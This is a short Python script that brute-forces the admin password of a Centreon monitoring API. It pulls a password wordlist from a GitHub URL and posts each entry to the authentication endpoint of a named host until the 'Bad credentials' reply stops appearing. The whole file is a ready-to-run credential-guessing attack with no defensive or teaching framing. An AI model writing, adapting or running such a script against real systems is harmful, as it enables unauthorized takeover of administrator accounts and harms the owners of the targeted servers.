#!/usr/bin/python

import urllib
import requests
import sys

GREEN = "\033[32m"
RED = "\033[31m"

url = "http://api.centron.com/centreon/api/index.php?action=authenticate"
expression = "Bad credentials"

def brute(username,password):
        data = {'username':username,'password':password}
        r = requests.post(url,data=data)
        if expression not in r.content :
                print (GREEN + "[+] Correct password Found: %s"%password)
                sys.exit()
        else:
                print (RED + "[-] Trying with: %s"%password)

def main():
        words = bytes(urllib.urlopen("https://raw.githubusercontent.com/Czerwinsk/Tools/master/passwords.txt").read())
        for payload in words.split('\n'):
                brute("admin",payload)

if __name__ == '__main__':
        main()
